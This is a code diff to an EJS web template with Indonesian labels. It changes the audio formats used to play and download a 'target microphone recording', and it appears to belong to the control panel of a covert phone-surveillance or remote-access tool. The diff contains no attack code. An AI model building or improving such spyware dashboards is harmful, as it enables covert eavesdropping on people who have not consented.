@@ -97,9 +97,11 @@
                             </svg>
                             <h3 class="text-gray-300 font-medium">Rekaman Mikrofon Target</h3>
                             <audio controls class="w-full">
+                                <source src="data:audio/mp4;base64,<%= parsedBody.data %>" type="audio/mp4">
+                                <source src="data:audio/aac;base64,<%= parsedBody.data %>" type="audio/aac">
                                 <source src="data:audio/3gpp;base64,<%= parsedBody.data %>" type="audio/3gpp">
-                                <source src="data:audio/mp3;base64,<%= parsedBody.data %>" type="audio/mp3">
-                                <source src="data:audio/ogg;base64,<%= parsedBody.data %>" type="audio/ogg">
+                                <source src="data:audio/wav;base64,<%= parsedBody.data %>" type="audio/wav">
+                                <source src="data:audio/mpeg;base64,<%= parsedBody.data %>" type="audio/mpeg">
                                 Browser Anda tidak mendukung elemen audio.
                             </audio>
                             <a href="data:audio/3gpp;base64,<%= parsedBody.data %>" download="record_<%= log.id %>.3gp"
